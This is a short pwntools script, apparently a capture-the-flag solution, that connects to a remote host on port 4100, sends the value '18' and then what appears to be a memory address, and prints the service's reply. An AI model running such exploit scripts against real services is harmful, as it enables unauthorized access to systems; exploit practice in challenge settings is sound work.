from pwn import *


io = remote('128.199.234.122', 4100)
print(io.recv())
io.sendline('18')
print(io.recv())
io.sendline('134517334')
print(io.recvall())
